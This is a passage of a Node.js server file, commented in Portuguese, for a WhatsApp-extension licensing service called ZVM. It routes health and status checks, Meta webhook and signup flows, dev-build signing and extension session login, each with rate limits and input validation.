function observeHttpTraffic(req, res) {
  const startedAt = Date.now();
  const method = String(req.method || 'OTHER').toUpperCase();
  const route = normalizeTrafficPath(req.url);
  res.once('finish', () => recordHttpTraffic(method, route, res.statusCode, Date.now() - startedAt));
}

const SEARCH_CONSOLE_VERIFICATION_PATH = '/googleb72a9c76039b24b4.html';
const SEARCH_CONSOLE_VERIFICATION_BODY = 'google-site-verification: googleb72a9c76039b24b4.html';

function handleSearchConsoleVerification(req, res, pathname) {
  const method = String(req.method || '').toUpperCase();
  if (pathname !== SEARCH_CONSOLE_VERIFICATION_PATH || (method !== 'GET' && method !== 'HEAD')) return false;
  const body = Buffer.from(SEARCH_CONSOLE_VERIFICATION_BODY, 'utf8');
  res.writeHead(200, {
    'Content-Type': 'text/plain; charset=utf-8',
    'Content-Length': body.length,
    'Cache-Control': 'no-store',
    ..._SEC_HEADERS,
  });
  res.end(method === 'HEAD' ? undefined : body);
  return true;
}

async function handleRequest(req, res) {
  const url = new URL(req.url, `http://localhost:${PORT}`);
  const p   = url.pathname;
  const ip  = getIp(req);

  // IP blacklist manual — bloqueio imediato antes de qualquer processamento
  if (isIpBlacklisted(ip)) {
    res.writeHead(403, { 'Content-Type': 'text/plain', 'Server': 'ZVM' });
    res.end('403 Forbidden');
    return;
  }

  if (handleSearchConsoleVerification(req, res, p)) return;

  if (sendPublicAsset(req, res, p)) return;
  if (serveSSX2012(req, res, p)) return;
  // Cloud pilot follows the SSX subroute pattern: no second listener or service.
  if (await serveZVMCloud(req, res, p)) return;

  // /robots.txt — páginas públicas podem ser indexadas; superfícies de
  // conta, licenciamento, APIs e operação permanecem fora de crawling.
  if (p === '/robots.txt' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8', 'Cache-Control': 'public, max-age=86400' });
    res.end([
      'User-agent: *',
      'Allow: /',
      'Disallow: /cliente',
      'Disallow: /client/',
      'Disallow: /extension/',
      'Disallow: /api/',
      'Disallow: /cakto/',
      'Disallow: /meta/',
      'Disallow: /analytics',
      'Disallow: /verificar',
      'Disallow: /hobbies/ssx/',
      'Disallow: /dev/cloud/',
      'Disallow: /health',
      'Disallow: /ready',
      'Disallow: /status',
      ''
    ].join('\n'));
    return;
  }

  // /health — resposta mínima para UptimeRobot/Render (sem diagnóstico interno)
  if (p === '/health' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8', 'Cache-Control': 'no-store', ..._SEC_HEADERS });
    res.end(JSON.stringify({ ok: true, build: ZVM_BUILD_ID, ts: new Date().toISOString() }));
    return;
  }

  if (p === '/ready' && req.method === 'GET') {
    let ready = !!serverReady;
    if (ready && CAKTO_WEBHOOK_SECRET && !_caktoIndexReady) ready = false;
    if (ready) {
      try { const db = await getMongoDb(); await db.command({ ping: 1 }); }
      catch (_) { ready = false; }
    }
    res.writeHead(ready ? 200 : 503, { 'Content-Type': 'application/json; charset=utf-8', 'Cache-Control': 'no-store', ..._SEC_HEADERS });
    res.end(JSON.stringify({ ok: ready, build: ZVM_BUILD_ID }));
    return;
  }

  // Public, immutable decorative slices from the original ZVM license art.
  // No keys, plans tied to customers, emails or other personal data are exposed.
  // Strictly whitelisted 3 tones x 15 slices (14 historical plus 1 seamless details);
  // no filesystem path supplied by caller. Old mail image URLs remain valid.
  // Exact original approved design for ZVM license mail, kept as one external
  // background with zero personalized data in its URL. Historical mail slices
  // remain served below without changes.
  if (req.method === 'GET' && /^\/assets\/zvm-email-art\/r46-73\/(start|pro|enterprise)\/original[.]jpg$/.test(p)) {
    const tone = /^\/assets\/zvm-email-art\/r46-73\/(start|pro|enterprise)\/original[.]jpg$/.exec(p)[1];
    try {
      const bytes = await fs.promises.readFile(path.join(__dirname, 'assets', 'email-licenses', tone + '.jpg'));
      res.writeHead(200, { 'Content-Type':'image/jpeg', 'Content-Length':bytes.length,
        'Cache-Control':'public, max-age=31536000, immutable', ..._SEC_HEADERS });
      res.end(bytes); return;
    } catch (_) {
      res.writeHead(503, { 'Cache-Control':'no-store', ..._SEC_HEADERS }); res.end(); return;
    }
  }

  if (req.method === 'GET' && p.startsWith('/assets/zvm-email-art/')) {
    const matched = new RegExp('^/assets/zvm-email-art/r46-69/(start|pro|enterprise)/([a-z-]+)[.]jpg$').exec(p);
    if (!matched) { res.writeHead(404, { 'Cache-Control':'no-store', ..._SEC_HEADERS }); res.end(); return; }
    try {
      const catalog = await zvmEmailArtSlices(matched[1]);
      const slice = Object.hasOwn(catalog, matched[2]) ? catalog[matched[2]] : null;
      if (!slice) { res.writeHead(404, { 'Cache-Control':'no-store', ..._SEC_HEADERS }); res.end(); return; }
      res.writeHead(200, { 'Content-Type':'image/jpeg', 'Content-Length':slice.buffer.length,
        'Cache-Control':'public, max-age=31536000, immutable', ..._SEC_HEADERS });
      res.end(slice.buffer); return;
    } catch (_) {
      res.writeHead(503, { 'Cache-Control':'no-store', ..._SEC_HEADERS }); res.end(); return;
    }
  }

  if (p === '/status' && req.method === 'GET') {
    // Página pública de status operacional — propositalmente NÃO revela
    // métricas de negócio (contagem de chaves ativas/totais) nem estado
    // detalhado do Mongo. Isso já é servido só pro admin autenticado em
    // R_ADMIN+'/status'. /health continua a checagem mínima pro Render/
    // UptimeRobot, sem nenhuma dependência deste endpoint.
    const _statusNow = Date.now();
    if (_statusNow - _publicStatusCache.checkedAt >= PUBLIC_STATUS_DB_CACHE_MS) {
      // Marca o instante antes do await para evitar stampede: requisições que
      // chegarem enquanto o ping está em voo usam o último estado conhecido.
      _publicStatusCache.checkedAt = _statusNow;
      try {
        const _sd = await getMongoDb();
        await _sd.command({ ping: 1 });
        _publicStatusCache.dbOk = true;
      } catch { _publicStatusCache.dbOk = false; }
    }
    const dbOk = _publicStatusCache.dbOk;
    const upSec = Math.floor(process.uptime());
    const upStr = upSec < 60 ? upSec + 's' : upSec < 3600 ? Math.floor(upSec/60) + 'm' : Math.floor(upSec/3600) + 'h ' + Math.floor((upSec%3600)/60) + 'm';
    const html = `<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta http-equiv="refresh" content="60"><title>ZVM — Status</title><link rel="stylesheet" href="/assets/zvm-status.be29b1782339.css"><link rel="stylesheet" href="/assets/zvm-r46-system.aa366d924866.css"></head><body><div class="card"><div class="logo">${renderStandaloneBrand('compact')}</div><h1>Status do Serviço</h1><div class="row"><span class="label">API</span><span class="value ok">● Operacional</span></div><div class="row"><span class="label">Banco de Dados</span><span class="value ${dbOk?'ok':'fail'}">${dbOk?'● Conectado':'● Desconectado'}</span></div><div class="row"><span class="label">Uptime</span><span class="value">${upStr}</span></div><div class="ts">Atualizado: ${new Date().toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo'})}</div></div></body></html>`;
    res.writeHead(dbOk ? 200 : 503, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store', ..._SEC_HEADERS, 'Content-Security-Policy': _CSP_PUBLIC_STRICT });
    res.end(html);
    return;
  }

  const _corsH = {
    'Access-Control-Allow-Origin':  (()=>{
      const o=req.headers.origin||'';
      if(p.startsWith(R_ADMIN)||(R_ANALYTICS&&p.startsWith(R_ANALYTICS))){return 'null';}
      // Extension API: nunca refletir uma Origin web arbitrária. Quando a
      // allowlist está configurada, só IDs oficiais passam; enquanto ela ainda
      // estiver vazia, preservamos compatibilidade aceitando apenas o formato
      // chrome-extension://<id-válido>, nunca https://evil.example.
      if (p.startsWith(R_EXT)) return isAllowedExtensionOrigin(o, p) || 'null';
      if (p === '/cakto/webhook') return 'null';
      return 'null';
    })(),
    'Access-Control-Allow-Methods': 'POST,GET,OPTIONS,DELETE',
    // Headers usados pelas APIs atuais da extensão.
    'Access-Control-Allow-Headers': 'Content-Type,Accept,x-access-token,Authorization,x-app-date,x-app-sig,x-app-ts',
    'Access-Control-Max-Age':       '86400',
    'Vary':                         'Origin',
    'X-Content-Type-Options':       'nosniff',
    'X-Frame-Options':              'DENY',
    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
    'Referrer-Policy':              'no-referrer',
    'Permissions-Policy':           'geolocation=(), microphone=(), camera=()',
    'Content-Security-Policy':      "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; font-src 'self' data:; img-src 'self' data: https://i.ytimg.com https://www.youtube.com https://www.youtube-nocookie.com; connect-src 'self' https://www.youtube.com https://www.youtube-nocookie.com; frame-src 'self' https://www.youtube.com https://www.youtube-nocookie.com; child-src 'self' https://www.youtube.com https://www.youtube-nocookie.com; media-src https://www.youtube.com https://www.youtube-nocookie.com; frame-ancestors 'none'; object-src 'none'; base-uri 'none'; form-action 'self'; upgrade-insecure-requests",
  };
  Object.entries(_corsH).forEach(([k, v]) => res.setHeader(k, v));
  if (req.method === 'OPTIONS') { res.writeHead(204); res.end(); return; }

  // ── Meta Official / Embedded Signup ─────────────────────────────────
  if (p === '/meta/webhook' && req.method === 'GET') {
    const mode = url.searchParams.get('hub.mode'), token = url.searchParams.get('hub.verify_token'), challenge = url.searchParams.get('hub.challenge');
    if (mode === 'subscribe' && META_WEBHOOK_VERIFY_TOKEN && safeCompare(String(token || ''), META_WEBHOOK_VERIFY_TOKEN) && /^\d{1,30}$/.test(String(challenge || ''))) {
      res.writeHead(200, { 'Content-Type':'text/plain; charset=utf-8', 'Cache-Control':'no-store', ..._SEC_HEADERS }); res.end(String(challenge)); return;
    }
    addSecurityAlert('META_WEBHOOK_VERIFY_FAIL', 'Falha de verificação do webhook Meta', ip);
    res.writeHead(403, { 'Content-Type':'text/plain; charset=utf-8', 'Cache-Control':'no-store', ..._SEC_HEADERS }); res.end('Forbidden'); return;
  }
  if (p === '/meta/webhook' && req.method === 'POST') {
    const raw = await readRawBody(req, 1024 * 1024);
    if (raw === null) { sendJson(res, { ok:false, error:'payload_too_large' }, 413); return; }
    if (!metaVerifyWebhookSignature(raw, req.headers['x-hub-signature-256'])) { addSecurityAlert('META_WEBHOOK_SIGNATURE_FAIL', 'Assinatura Meta inválida', ip); sendJson(res, { ok:false, error:'invalid_signature' }, 401); return; }
    let payload; try { payload = JSON.parse(raw); } catch (_) { sendJson(res, { ok:false, error:'invalid_payload' }, 400); return; }
    try { await storeMetaWebhook(payload, raw); sendJson(res, { ok:true }); } catch (error) { console.error('[META] webhook store:', safeScalar(error.message, 120)); sendJson(res, { ok:false, error:'temporarily_unavailable' }, 503); }
    return;
  }
  // ── Internal DEV build signer: descriptor/hash metadata only ──────────
  if (p === '/internal/dev-build/sign' && req.method === 'POST') {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
    if (!ZVM_DEV_SIGNED_BUILDS_ALLOW || !ZVM_DEV_SIGNING_SERVICE) {
      sendJson(res, { ok:false, errorCode:'not_found' }, 404); return;
    }
    if (!checkRateLimit(ip, 'dev_sign')) {
      sendJson(res, { ok:false, errorCode:'rate_limited', retryable:true }, 429); return;
    }
    const declaredLength = Number(req.headers['content-length'] || 0);
    if (Number.isFinite(declaredLength) && declaredLength > 32 * 1024) {
      sendJson(res, { ok:false, errorCode:'payload_too_large' }, 413); return;
    }
    try {
      const body = await parseBody(req);
      const descriptor = body && typeof body === 'object' && !Array.isArray(body) && body.descriptor
        ? body.descriptor : body;
      const signed = ZVM_DEV_SIGNING_SERVICE.sign(descriptor, req.headers.authorization || '');
      sendJson(res, signed, 200);
    } catch (error) {
      const code = String(error?.message || 'DEV_BUILD_SIGNING_FAILED').slice(0, 80);
      if (code === 'DEV_BUILD_AGENT_UNAUTHORIZED') {
        sendJson(res, { ok:false, errorCode:'unauthorized' }, 401); return;
      }
      const safeCodes = new Set([
        'DEV_BUILD_DESCRIPTOR_INVALID','DEV_EXTENSION_VERSION_INVALID','DEV_EXTENSION_ID_INVALID','DEV_EXTENSION_ID_NOT_ALLOWED',
        'DEV_SOURCE_TREE_SHA256_INVALID','DEV_BUILD_FINGERPRINT_INVALID','DEV_BUILD_ID_INVALID','DEV_BUILD_ID_VERSION_MISMATCH',
        'DEV_BUILD_ID_SOURCE_MISMATCH','DEV_PROTECTED_FILES_INVALID','DEV_BUILD_CREATED_AT_INVALID','DEV_BUILD_CREATED_AT_FUTURE',
        'DEV_BUILD_TOO_OLD','DEV_BUILD_MAX_AGE_INVALID','DEV_SIGNING_TIME_INVALID'
      ]);
      sendJson(res, { ok:false, errorCode: safeCodes.has(code) ? code : 'DEV_BUILD_SIGNING_FAILED' }, 400);
    }
    return;
  }

  if (p === R_EXT+'/v3/notifications' && req.method === 'GET') {
    if (!checkRateLimit(ip, 'ext_public_notifications', 120, 60000)) { sendJson(res, { errorCode:'RATE_LIMITED' }, 429); return; }
    res.setHeader('Cache-Control', 'no-store');
    sendJson(res, { notifications: EXTENSION_PUBLIC_NOTIFICATIONS }); return;
  }
  if (p === R_EXT+'/v3/tutorial' && req.method === 'GET') {
    if (!checkRateLimit(ip, 'ext_public_tutorial', 120, 60000)) { sendJson(res, { errorCode:'RATE_LIMITED' }, 429); return; }
    const feature = String(url.searchParams.get('feature') || '').toLowerCase().replace(/[^a-z0-9_-]/g, '').slice(0, 80);
    if (!feature) { sendJson(res, { errorCode:'TUTORIAL_FEATURE_INVALID' }, 400); return; }
    const tutorialUrl = EXTENSION_PUBLIC_TUTORIALS.get(feature) || '';
    if (!tutorialUrl) { sendJson(res, { errorCode:'TUTORIAL_NOT_FOUND' }, 404); return; }
    res.setHeader('Cache-Control', 'no-store');
    sendJson(res, { feature, url:tutorialUrl }); return;
  }
  if (p === R_EXT+'/v3/meta/config' && req.method === 'GET') { sendJson(res, metaPublicConfig()); return; }
  if (p === R_EXT+'/v3/meta/manual/connect' && req.method === 'POST') {
    if (!metaSecretStorageConfigured()) { sendJson(res, { code:'META_CRYPTO_UNAVAILABLE', message:'O cofre seguro da Meta ainda não foi configurado no servidor.' }, 503); return; }
    if (!checkRateLimit(ip,'meta_manual_connect',6,60000)) { sendJson(res,{code:'RATE_LIMITED',message:'Aguarde antes de tentar conectar novamente.'},429);return; }
    const body=await parseBody(req),owner=await metaResolveOwner(req,body);
    if(!owner){sendJson(res,{code:'META_UNAUTHORIZED',message:'Sessão ZVM inválida para conectar a Meta.'},403);return;}
    const accessToken=safeScalar(body.accessToken,8192),wabaId=String(body.wabaId||'').trim(),phoneNumberId=String(body.phoneNumberId||'').trim();
    if(accessToken.length<20||/[\s\x00-\x1f\x7f]/.test(accessToken)){sendJson(res,{code:'META_TOKEN_INVALID',message:'Token de acesso da Meta inválido.'},400);return;}
    if(!/^\d{5,40}$/.test(wabaId)||!/^\d{5,40}$/.test(phoneNumberId)){sendJson(res,{code:'META_ASSET_INVALID',message:'WABA ID ou Phone Number ID inválido.'},400);return;}
    try{
      const phone=await metaValidateAssets(accessToken,wabaId,phoneNumberId),now=new Date(),tokenBox=metaEncrypt(accessToken,owner.ownerId+':token'),db=await getMongoDb();
      await ensureMetaIndexes(db);
      const previous=await db.collection(META_COLLECTION).findOne({_id:owner.ownerId},{projection:{connectedAt:1}}).catch(()=>null);
      const next={connectionMode:'manual',token:tokenBox,wabaId,phoneNumberId,verifiedName:safeScalar(phone.verified_name,160),displayPhoneNumber:safeScalar(phone.display_phone_number,60),qualityRating:safeScalar(phone.quality_rating,40),status:'connected',registrationStatus:'manual',webhookStatus:'manual_setup',connectedAt:previous&&previous.connectedAt||now,lastValidatedAt:now,updatedAt:now};
      await db.collection(META_COLLECTION).updateOne({_id:owner.ownerId},{$set:next,$unset:{registrationPin:''}},{upsert:true});
      sendJson(res,{ok:true,connection:metaPublicConnection(next)});return;
    }catch(error){
      if(error&&error.code===11000){sendJson(res,{code:'META_PHONE_ALREADY_CONNECTED',message:'Este Phone Number ID já está conectado a outra conta ZVM.'},409);return;}
      addSecurityAlert('META_MANUAL_CONNECT_FAILED',safeScalar(error&&error.code||error&&error.message,120,'Falha Meta'),ip);
      sendJson(res,{code:error&&error.code||'META_MANUAL_CONNECT_FAILED',message:error&&error.message||'Não foi possível validar a conexão manual.'},error&&error.status||502);return;
    }
  }
  if (p === R_EXT+'/v3/meta/embedded-signup/start' && req.method === 'POST') {
    if (!metaConfigured()) { sendJson(res, { code:'META_NOT_CONFIGURED', message:'A conexão automática com a Meta ainda não foi configurada no servidor.' }, 503); return; }
    if (!checkRateLimit(ip, 'meta_signup_start', 8, 60000)) { sendJson(res, { code:'RATE_LIMITED', message:'Aguarde antes de iniciar outra conexão.' }, 429); return; }
    const body = await parseBody(req), owner = await metaResolveOwner(req, body);
    if (!owner) { sendJson(res, { code:'META_UNAUTHORIZED', message:'Sessão ZVM inválida para conectar a Meta.' }, 403); return; }
    const db = await getMongoDb(); await ensureMetaIndexes(db);
    await db.collection(META_FLOW_COLLECTION).deleteMany({ ownerId:owner.ownerId, status:{ $in:['pending','processing'] } }).catch(()=>{});
    const flowId = crypto.randomBytes(24).toString('hex'), expiresAt = new Date(Date.now()+META_FLOW_TTL_MS);
    await db.collection(META_FLOW_COLLECTION).insertOne({ _id:flowId, ownerId:owner.ownerId, auth:owner.auth, status:'pending', createdAt:new Date(), expiresAt, ipHash:crypto.createHash('sha256').update(ip).digest('hex') });
    const authUrl = new URL('/cliente/integracoes/meta', BASE_URL); authUrl.searchParams.set('flow', flowId);
    if (process.env.NODE_ENV === 'production' && authUrl.protocol !== 'https:') { sendJson(res,{code:'META_HTTPS_REQUIRED',message:'O onboarding Meta exige HTTPS.'},503); return; }
    sendJson(res, { flowId, authUrl:authUrl.toString(), status:'pending' }); return;
  }
  if (p === '/cliente/integracoes/meta' && req.method === 'GET') {
    if (!metaConfigured()) { sendHtml(res,'<!doctype html><meta charset="utf-8"><title>Meta indisponível</title><p>Integração Meta ainda não configurada.</p>',503); return; }
    const flowId = String(url.searchParams.get('flow')||'');
    if (!/^[a-f0-9]{48}$/.test(flowId)) { sendHtml(res,'<!doctype html><meta charset="utf-8"><p>Conexão inválida.</p>',400); return; }
    const db=await getMongoDb(); await ensureMetaIndexes(db); const flow=await db.collection(META_FLOW_COLLECTION).findOne({_id:flowId});
    if(!flow||flow.status!=='pending'||new Date(flow.expiresAt).getTime()<Date.now()){sendHtml(res,'<!doctype html><meta charset="utf-8"><p>Esta conexão expirou. Volte à ZVM e tente novamente.</p>',410);return;}
    sendMetaSignupHtml(res, metaSignupHtml(flowId)); return;
  }
  if (p === R_EXT+'/v3/meta/embedded-signup/complete' && req.method === 'POST') {
    if (!metaConfigured()) { sendJson(res,{code:'META_NOT_CONFIGURED',message:'Integração Meta não configurada.'},503);return; }
    if (!requireSameOriginPost(req)) { sendJson(res,{code:'META_INVALID_ORIGIN',message:'Origem inválida.'},403);return; }
    if (!checkRateLimit(ip,'meta_signup_complete',12,60000)) { sendJson(res,{code:'RATE_LIMITED',message:'Muitas tentativas.'},429);return; }
    const body=await parseBody(req),flowId=String(body.flowId||''),code=String(body.code||''),wabaId=String(body.wabaId||'').replace(/\D/g,''),phoneNumberId=String(body.phoneNumberId||'').replace(/\D/g,'');
    if(!/^[a-f0-9]{48}$/.test(flowId)||!code||code.length>4096||!/^\d{5,40}$/.test(wabaId)||!/^\d{5,40}$/.test(phoneNumberId)){sendJson(res,{code:'META_SIGNUP_INVALID',message:'Dados de autorização incompletos.'},400);return;}
    const db=await getMongoDb(); await ensureMetaIndexes(db);
    const claimed=await db.collection(META_FLOW_COLLECTION).findOneAndUpdate({_id:flowId,status:'pending',expiresAt:{$gt:new Date()}},{$set:{status:'processing',processingAt:new Date()}},{returnDocument:'after'});
    const flow=claimed&&typeof claimed==='object'&&'value'in claimed?claimed.value:claimed;
    if(!flow){sendJson(res,{code:'META_SIGNUP_EXPIRED',message:'Esta autorização expirou ou já foi utilizada.'},410);return;}
    try {
      const token=await metaExchangeCode(code); await metaValidateAccessToken(token); const phone=await metaValidateAssets(token,wabaId,phoneNumberId); await metaSubscribeWaba(token,wabaId);
      let registrationStatus='not_attempted', pinBox=null;
      if(META_AUTO_REGISTER_PHONE){const pin=metaRegistrationPin();pinBox=metaEncrypt(pin,flow.ownerId+':pin');try{registrationStatus=await metaRegisterPhone(token,phoneNumberId,pin)?'registered':'needs_attention';}catch(regErr){registrationStatus='needs_attention';console.warn('[META] registro do número requer atenção:',safeScalar(regErr.message,120));}}
      const now=new Date(); const tokenBox=metaEncrypt(token,flow.ownerId+':token');
      await db.collection(META_COLLECTION).updateOne({_id:flow.ownerId},{$set:{connectionMode:'embedded',token:tokenBox,registrationPin:pinBox,wabaId,phoneNumberId,verifiedName:safeScalar(phone.verified_name,160),displayPhoneNumber:safeScalar(phone.display_phone_number,60),qualityRating:safeScalar(phone.quality_rating,40),status:'connected',registrationStatus,webhookStatus:'subscribed',connectedAt:now,lastValidatedAt:now,updatedAt:now}},{upsert:true});
      await db.collection(META_FLOW_COLLECTION).updateOne({_id:flowId,status:'processing'},{$set:{status:'connected',connectedAt:now},$unset:{processingAt:''}});
      sendJson(res,{ok:true,status:'connected',registrationStatus});return;
    } catch(error) {
      await db.collection(META_FLOW_COLLECTION).updateOne({_id:flowId},{$set:{status:'failed',failedAt:new Date(),message:safeScalar(error.message,200,'Falha Meta')}}).catch(()=>{});
      addSecurityAlert('META_SIGNUP_FAILED', safeScalar(error.code||error.message,120), ip);
      sendJson(res,{code:error.code||'META_SIGNUP_FAILED',message:error.message||'Não foi possível concluir a autorização.'},error.status&&error.status>=400&&error.status<600?error.status:502);return;
    }
  }
  if (p === R_EXT+'/v3/meta/embedded-signup/status' && req.method === 'POST') {
    if(!checkRateLimit(ip,'meta_status',60,60000)){sendJson(res,{code:'RATE_LIMITED',message:'Muitas consultas.'},429);return;}
    const body=await parseBody(req),owner=await metaResolveOwner(req,body);if(!owner){sendJson(res,{code:'META_UNAUTHORIZED',message:'Sessão ZVM inválida.'},403);return;}
    const flowId=String(body.flowId||'');if(!/^[a-f0-9]{48}$/.test(flowId)){sendJson(res,{code:'META_FLOW_INVALID',message:'Conexão inválida.'},400);return;}
    const db=await getMongoDb();await ensureMetaIndexes(db);const flow=await db.collection(META_FLOW_COLLECTION).findOne({_id:flowId,ownerId:owner.ownerId});if(!flow){sendJson(res,{code:'META_FLOW_NOT_FOUND',message:'Conexão não encontrada.'},404);return;}
    const rec=flow.status==='connected'?await db.collection(META_COLLECTION).findOne({_id:owner.ownerId}):null;sendJson(res,{status:flow.status,message:flow.status==='failed'?safeScalar(flow.message,200):'',connection:metaPublicConnection(rec)});return;
  }
  if (p === R_EXT+'/v3/meta/connection/validate' && req.method === 'POST') {
    if(!checkRateLimit(ip,'meta_validate',15,60000)){sendJson(res,{code:'RATE_LIMITED'},429);return;}const body=await parseBody(req),owner=await metaResolveOwner(req,body);if(!owner){sendJson(res,{code:'META_UNAUTHORIZED',message:'Sessão ZVM inválida.'},403);return;}const rec=await metaGetConnection(owner.ownerId);if(!rec){sendJson(res,{code:'META_NOT_CONNECTED',message:'Nenhuma conta Meta conectada.'},404);return;}
    try{const token=metaDecrypt(rec.token,owner.ownerId+':token'),phone=await metaValidateAssets(token,String(rec.wabaId),String(rec.phoneNumberId)),now=new Date(),next={verifiedName:safeScalar(phone.verified_name,160),displayPhoneNumber:safeScalar(phone.display_phone_number,60),qualityRating:safeScalar(phone.quality_rating,40),lastValidatedAt:now,updatedAt:now,status:'connected'};const db=await getMongoDb();await db.collection(META_COLLECTION).updateOne({_id:owner.ownerId},{$set:next});sendJson(res,{ok:true,connection:metaPublicConnection({...rec,...next})});return;}catch(error){if(error.status===401){const db=await getMongoDb();await db.collection(META_COLLECTION).updateOne({_id:owner.ownerId},{$set:{status:'reauthorization_required',updatedAt:new Date()}}).catch(()=>{});}sendJson(res,{code:error.code||'META_VALIDATE_FAILED',message:error.message||'Falha ao validar a conta.'},error.status||502);return;}
  }
  if (p === R_EXT+'/v3/meta/templates' && req.method === 'POST') {
    if(!checkRateLimit(ip,'meta_templates',20,60000)){sendJson(res,{code:'RATE_LIMITED'},429);return;}const body=await parseBody(req),owner=await metaResolveOwner(req,body);if(!owner){sendJson(res,{code:'META_UNAUTHORIZED',message:'Sessão ZVM inválida.'},403);return;}const rec=await metaGetConnection(owner.ownerId);if(!rec){sendJson(res,{code:'META_NOT_CONNECTED',message:'Nenhuma conta Meta conectada.'},404);return;}try{const token=metaDecrypt(rec.token,owner.ownerId+':token'),data=await metaFetch(`${rec.wabaId}/message_templates?fields=name,status,language,category&limit=100`,token);sendJson(res,{data:Array.isArray(data.data)?data.data.slice(0,100):[]});return;}catch(error){sendJson(res,{code:error.code||'META_TEMPLATES_FAILED',message:error.message||'Falha ao consultar templates.'},error.status||502);return;}
  }
  if (p === R_EXT+'/v3/meta/messages/test' && req.method === 'POST') {
    if(!checkRateLimit(ip,'meta_send',8,60000)){sendJson(res,{code:'RATE_LIMITED',message:'Aguarde antes de enviar novamente.'},429);return;}const body=await parseBody(req),owner=await metaResolveOwner(req,body);if(!owner){sendJson(res,{code:'META_UNAUTHORIZED',message:'Sessão ZVM inválida.'},403);return;}const to=normalizePhone(body.to),message=safeScalar(body.body,4096);if(!to||to.length<8||!message){sendJson(res,{code:'META_SEND_INVALID',message:'Destino ou mensagem inválidos.'},400);return;}const rec=await metaGetConnection(owner.ownerId);if(!rec){sendJson(res,{code:'META_NOT_CONNECTED',message:'Nenhuma conta Meta conectada.'},404);return;}try{const token=metaDecrypt(rec.token,owner.ownerId+':token'),data=await metaFetch(`${rec.phoneNumberId}/messages`,token,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({messaging_product:'whatsapp',recipient_type:'individual',to,type:'text',text:{preview_url:false,body:message}})});sendJson(res,data);return;}catch(error){sendJson(res,{code:error.code||'META_SEND_FAILED',message:error.message||'Falha ao enviar pela Meta.'},error.status||502);return;}
  }
  if (p === R_EXT+'/v3/meta/connection/disconnect' && req.method === 'POST') {
    if(!checkRateLimit(ip,'meta_disconnect',8,60000)){sendJson(res,{code:'RATE_LIMITED'},429);return;}const body=await parseBody(req),owner=await metaResolveOwner(req,body);if(!owner){sendJson(res,{code:'META_UNAUTHORIZED',message:'Sessão ZVM inválida.'},403);return;}const db=await getMongoDb();await ensureMetaIndexes(db);await db.collection(META_COLLECTION).deleteOne({_id:owner.ownerId});await db.collection(META_FLOW_COLLECTION).deleteMany({ownerId:owner.ownerId});sendJson(res,{ok:true,disconnected:true});return;
  }

  if (APP_SECRET) {
    if (p === '/admin' || p.startsWith('/admin/')) { res.writeHead(404); res.end('Not found'); return; }
    if (p === '/analytics' || p.startsWith('/analytics/')) { res.writeHead(404); res.end('Not found'); return; }
  }

  // Fluxo web legado do produto standalone descontinuado. A V611 autentica
  // exclusivamente pela API V4 dentro da extensão; manter este redirect antigo
  // exporia credenciais em query string.
  if (((p === R_EXT+'/auth/' || p === R_EXT+'/auth') && req.method === 'GET') ||
      (p === R_EXT+'/auth/verify' && req.method === 'POST')) {
    res.writeHead(410, { 'Content-Type': 'application/json; charset=utf-8', 'Cache-Control': 'no-store', ..._SEC_HEADERS });
    res.end(JSON.stringify({ ok:false, error:'legacy_web_auth_retired', use:'/extension/v4/session/login' }));
    return;
  }

  // ── Extension API V4: sessões opacas e capabilities do servidor ──────
  // V3 permanece abaixo, sem mudança de path ou schema. V4 nunca recebe
  // tier/capabilities/usage do cliente: toda decisão nasce da conta/chave
  // realmente carregada do banco/cache canônico do servidor.
  if (p === R_EXT+'/v4/session/key' && req.method === 'POST') {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
    if (!checkRateLimit(ip, 'ext_key_v4')) {
      sendExtensionRateLimited(res, ip, 'ext_key_v4', { ok: false, errorCode: 'rate_limited', retryable: true });
      return;
    }
    try {
      const body = await parseBody(req);
      const keyCodeForBuild = sanitizeId(body.authKey, 32);
      const deviceIdForBuild = String(body.deviceId || '').trim().slice(0, 160);
      const devBuildAllowed = zvmSecurityDevBuildAllowed(keyCodeForBuild, deviceIdForBuild);
      const buildClient = await zvmSecurityCheckClientShared(body.clientSecurity, { allowUnrecognized:devBuildAllowed, licenseKey:keyCodeForBuild });
      if (!buildClient.ok) { sendJson(res, { ok:false, errorCode:buildClient.code }, zvmSecurityClientErrorStatus(buildClient.code)); return; }
      const authorized = await authorizeExtensionKeySession(body);
      if (!authorized.ok) {
        const { status, ...errorBody } = authorized;
        sendJson(res, errorBody, status);
        return;
      }
      if (buildClient.signedDev === true && authorized.devAccess !== true) {
        sendJson(res, { ok:false, errorCode:'DEV_ACCESS_REQUIRED' }, 403); return;
      }
      const issued = await createExtensionSession({
        subject: authorized.subject,
        authMethod: 'license_key',
        licenseKeyCode: authorized.licenseKeyCode,
        phoneNumber: authorized.phoneNumber,
        deviceId: authorized.deviceId,
        ...extensionSessionSecurityFields(buildClient),
        entitlementRevision: authorized.entitlement.entitlementRevision,
      });
      const keyRecord = keys[authorized.licenseKeyCode];
      if (keyRecord) {
        keyRecord.lastUsed = new Date().toISOString();
        keyRecord.lastIp = ip;
        keyRecord.wppVersion = safeScalar(body.wppVersion, 80, '-');
        keyRecord.lastPhone = authorized.phoneNumber;
        upsertActivation(authorized.licenseKeyCode, authorized.phoneNumber, authorized.deviceId, {
          ip, wppVersion: keyRecord.wppVersion,
        }).catch(() => {});
        saveKey(authorized.licenseKeyCode).catch(() => {});
      }
      sendJson(res, extensionSessionSuccess(issued.token, issued.doc, authorized.entitlement));
    } catch (error) {
      console.error('[extension-v4] session/key indisponível:', error.message);
      sendJson(res, { ok: false, errorCode: 'temporarily_unavailable', retryable: true }, 503);
    }
    return;
  }

  if (p === R_EXT+'/v4/session/login' && req.method === 'POST') {
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
    if (!checkRateLimit(ip, 'login')) {
      sendJson(res, { ok: false, errorCode: 'rate_limited', retryable: true }, 429);
